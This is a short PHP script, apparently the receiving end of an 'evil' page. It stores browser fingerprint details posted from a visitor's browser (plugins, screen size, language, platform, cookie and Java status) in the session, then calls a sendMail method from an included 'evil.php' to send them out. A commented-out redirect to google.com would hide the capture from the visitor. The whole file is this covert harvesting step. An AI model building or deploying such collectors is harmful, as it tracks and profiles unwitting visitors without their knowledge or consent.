<?php
session_start();

require "../src/evil.php";



$now = date("Y-m-d H:i:s");
$evil = new evil();


$_SESSION['HistroyLength'] = $_POST['HistroyLength'];

$_SESSION['Language'] = $_POST['Language'];

$_SESSION['JavaEnabled'] = $_POST['JavaEnabled'];

$_SESSION['ScreenHeigth'] = $_POST['ScreenHeight'];

$_SESSION['ScreenWidth'] = $_POST['ScreenWidth'];

$_SESSION['UserPlattform']= $_POST['UserPlattform'];

$_SESSION['AppName'] = $_POST['AppName'];

$_SESSION['CookiesEnabled'] = $_POST['CookiesEnabled'];

$_SESSION['Plugins'] = $_POST['Plugins'];


$evil->sendMail($now);
//header('Location: http://google.com');